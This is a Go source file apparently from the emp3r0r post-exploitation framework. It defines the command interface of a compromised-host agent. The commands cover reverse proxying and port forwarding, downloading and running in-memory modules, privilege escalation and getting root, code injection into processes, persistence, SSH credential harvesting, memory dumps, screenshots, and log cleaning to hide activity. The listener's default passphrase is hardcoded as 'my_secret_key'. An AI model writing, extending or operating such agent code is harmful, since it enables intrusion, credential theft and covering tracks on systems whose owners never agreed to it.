package agent

import (
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/spf13/cobra"
)

// C2Commands returns a root cobra.Command for C2 commands.
func C2Commands() *cobra.Command {
	rootCmd := &cobra.Command{
		Short: "emp3r0r C2 commands",
	}

	// Add command groups for categorization
	rootCmd.AddGroup(
		&cobra.Group{ID: "generic", Title: "Generic Commands"},
		&cobra.Group{ID: "linux", Title: "Linux Commands"},
		&cobra.Group{ID: "windows", Title: "Windows Commands"},
	)
	rootCmd.PersistentFlags().StringP("cmd_id", "", "", "Command ID")

	// Generic commands group
	lsCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdListDir,
		Short:   "List directory entries",
		Example: "!ls --path <path>",
		GroupID: "generic",
		Run:     runListDir,
	}
	lsCmd.Flags().StringP("path", "p", "", "Path to list")
	rootCmd.AddCommand(lsCmd)

	// C2 Stat command
	statCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdStat,
		Short:   "Retrieve file statistics",
		Example: "!stat --path <path>",
		GroupID: "generic",
		Run:     runStat,
	}
	statCmd.Flags().StringP("path", "p", "", "Path to stat")
	rootCmd.AddCommand(statCmd)

	// C2 Bring2CC command
	bring2ccCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdBring2CC,
		Short:   "Setup reverse proxy",
		Example: "!bring2cc --addr <target> --kcp <on/off>",
		GroupID: "generic",
		Run:     runBring2CC,
	}
	bring2ccCmd.Flags().StringP("addr", "a", "", "Target agent IP address")
	bring2ccCmd.Flags().StringP("kcp", "k", "off", "Use KCP for reverse proxy (on/off)")
	rootCmd.AddCommand(bring2ccCmd)

	// C2 SSHD command
	sshdCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdSSHD,
		Short:   "Start an SSHD server",
		Example: "!sshd --shell <shell> --port <port> --args <args>",
		GroupID: "generic",
		Run:     runSSHD,
	}
	sshdCmd.Flags().StringP("shell", "s", "", "Shell to use")
	sshdCmd.Flags().StringP("port", "p", "", "Port to use")
	sshdCmd.Flags().StringSliceP("args", "a", []string{}, "Arguments for SSHD")
	rootCmd.AddCommand(sshdCmd)

	// C2 Proxy command
	proxyCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdProxy,
		Short:   "Start a Socks5 proxy",
		Example: "!proxy --mode <mode> --addr <address>",
		GroupID: "generic",
		Run:     runProxy,
	}
	proxyCmd.Flags().StringP("mode", "m", "", "Proxy mode")
	proxyCmd.Flags().StringP("addr", "a", "", "Address to bind")
	rootCmd.AddCommand(proxyCmd)

	// C2 Port Forwarding command
	portFwdCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdPortFwd,
		Short:   "Setup port forwarding",
		Example: "!port_fwd --to <target> --shID <session_id> --operation <operation> --timeout <timeout>",
		GroupID: "generic",
		Run:     runPortFwd,
	}
	portFwdCmd.Flags().StringP("to", "t", "", "Target address")
	portFwdCmd.Flags().StringP("shID", "s", "", "Session ID")
	portFwdCmd.Flags().StringP("operation", "o", "", "Operation type")
	portFwdCmd.Flags().IntP("timeout", "T", 0, "Timeout")
	rootCmd.AddCommand(portFwdCmd)

	// C2 Delete Port Forwarding command
	deletePortFwdCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdDeletePortFwd,
		Short:   "Delete port forwarding session",
		Example: "!delete_portfwd --id <session_id>",
		GroupID: "generic",
		Run:     runDeletePortFwd,
	}
	deletePortFwdCmd.Flags().StringP("id", "i", "", "Session ID")
	rootCmd.AddCommand(deletePortFwdCmd)

	// C2 Utils command
	utilsCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdUtils,
		Short:   "Run utility functions",
		Example: "!utils --checksum <checksum> --download_addr <download_addr>",
		GroupID: "generic",
		Run:     runUtils,
	}
	utilsCmd.Flags().StringP("checksum", "c", "", "Checksum")
	utilsCmd.Flags().StringP("download_addr", "d", "", "Download address")
	rootCmd.AddCommand(utilsCmd)

	// C2 Custom Module command
	customModuleCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdCustomModule,
		Short:   "Load a custom module",
		Example: "!custom_module --mod_name <name> --exec <command> --env <env> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>",
		GroupID: "generic",
		Run:     runCustomModule,
	}
	customModuleCmd.Flags().StringP("mod_name", "m", "", "Module name")
	customModuleCmd.Flags().StringP("exec", "x", "", "Command to execute")
	customModuleCmd.Flags().StringP("checksum", "c", "", "Checksum")
	customModuleCmd.Flags().BoolP("in_mem", "i", false, "Load module in memory")
	customModuleCmd.Flags().StringP("type", "t", "", "Payload type")
	customModuleCmd.Flags().StringP("file_to_download", "f", "", "File to download")
	customModuleCmd.Flags().StringP("env", "e", "", "Environment variables")
	customModuleCmd.Flags().StringP("download_addr", "d", "", "Download address")
	rootCmd.AddCommand(customModuleCmd)

	// C2 Upgrade Agent command
	updateAgentCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdUpdateAgent,
		Short:   "Upgrade agent",
		Example: "!upgrade_agent --checksum <checksum>",
		GroupID: "generic",
		Run:     runUpdateAgent,
	}
	updateAgentCmd.Flags().StringP("checksum", "c", "", "Checksum")
	rootCmd.AddCommand(updateAgentCmd)

	// C2 Listener command
	listenerCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdListener,
		Short:   "Start a listener",
		Example: "!listener --listener <listener> --port <port> --payload <payload> --compression <on/off> --passphrase <passphrase>",
		GroupID: "generic",
		Run:     runListener,
	}
	listenerCmd.Flags().StringP("listener", "l", "http_aes_compressed", "Listener type")
	listenerCmd.Flags().StringP("port", "p", "8000", "Port")
	listenerCmd.Flags().StringP("payload", "P", "", "Payload")
	listenerCmd.Flags().StringP("compression", "c", "on", "Compression (on/off)")
	listenerCmd.Flags().StringP("passphrase", "s", "my_secret_key", "Passphrase")
	rootCmd.AddCommand(listenerCmd)

	// C2 File Server command
	fileServerCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdFileServer,
		Short:   "Start file server",
		Example: "!file_server --port <port> --switch <on/off>",
		GroupID: "generic",
		Run:     runFileServer,
	}
	fileServerCmd.Flags().StringP("port", "p", "8000", "Port")
	fileServerCmd.Flags().StringP("switch", "s", "on", "Switch (on/off)")
	rootCmd.AddCommand(fileServerCmd)

	// C2 File Downloader command
	fileDownloaderCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdFileDownloader,
		Short:   "Download file",
		Example: "!file_downloader --download_addr <url> --path <path> --checksum <checksum>",
		GroupID: "generic",
		Run:     runFileDownloader,
	}
	fileDownloaderCmd.Flags().StringP("download_addr", "u", "", "URL to download")
	fileDownloaderCmd.Flags().StringP("path", "p", "", "Path to save")
	fileDownloaderCmd.Flags().StringP("checksum", "c", "", "Checksum")
	rootCmd.AddCommand(fileDownloaderCmd)

	// C2 Memory Dump command
	memDumpCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdMemDump,
		Short:   "Memory dump",
		Example: "!mem_dump --pid <pid>",
		GroupID: "generic",
		Run:     runMemDump,
	}
	memDumpCmd.Flags().IntP("pid", "p", 0, "PID of target process")
	rootCmd.AddCommand(memDumpCmd)

	// !lpe --script_name <script_name> --checksum <checksum>
	lpeCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdLPE,
		Short:   "Run LPE script",
		Example: "!lpe --script_name <script_name> --checksum <checksum>",
		GroupID: "generic",
		Run:     runLPELinux,
	}
	lpeCmd.Flags().StringP("script_name", "s", "", "Script name")
	lpeCmd.Flags().StringP("checksum", "c", "", "Checksum")
	rootCmd.AddCommand(lpeCmd)

	// !ssh_harvester --code_pattern <hex> --reg_name <register> --stop <bool>
	sshHarvesterCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdSSHHarvester,
		Short:   "Start SSH harvester",
		Example: "!ssh_harvester --code_pattern <hex> --reg_name <reg> --stop <bool>",
		GroupID: "generic",
		Run:     runSSHHarvesterLinux,
	}
	sshHarvesterCmd.Flags().StringP("code_pattern", "p", "", "Code pattern")
	sshHarvesterCmd.Flags().StringP("reg_name", "r", "RBP", "Register name")
	sshHarvesterCmd.Flags().BoolP("stop", "s", false, "Stop the harvester")
	rootCmd.AddCommand(sshHarvesterCmd)

	// !inject --method <method> --pid <pid> --checksum <checksum>
	injectCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdInject,
		Short:   "Inject code",
		Example: "!inject --method <method> --pid <pid> --checksum <checksum>",
		GroupID: "linux",
		Run:     runInjectLinux,
	}
	injectCmd.Flags().StringP("method", "m", "", "Injection method")
	injectCmd.Flags().StringP("pid", "p", "", "Process ID")
	injectCmd.Flags().StringP("checksum", "c", "", "Checksum")
	rootCmd.AddCommand(injectCmd)

	// !persistence --method <method>
	persistenceCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdPersistence,
		Short:   "Set up persistence",
		Example: "!persistence --method <method>",
		GroupID: "linux",
	}
	persistenceCmd.Flags().StringP("method", "m", "", "Persistence method")
	rootCmd.AddCommand(persistenceCmd)

	// !get_root (no flags)
	getRootCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdGetRoot,
		Short:   "Attempt to gain root privileges",
		Example: "!get_root",
		GroupID: "linux",
		Run:     runGetRootLinux,
	}
	rootCmd.AddCommand(getRootCmd)

	// !clean_log --keyword <keyword>
	cleanLogCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdCleanLog,
		Short:   "Clean logs",
		Example: "!clean_log --keyword <keyword>",
		GroupID: "linux",
		Run:     runCleanLogLinux,
	}
	cleanLogCmd.Flags().StringP("keyword", "k", "", "Keyword to clean logs")
	rootCmd.AddCommand(cleanLogCmd)

	screenshotCmd := &cobra.Command{
		Use:     emp3r0r_def.C2CmdScreenshot,
		Short:   "Take screenshot",
		GroupID: "generic",
		Run:     screenshotCmdRun,
	}
	rootCmd.AddCommand(screenshotCmd)
	return rootCmd
}
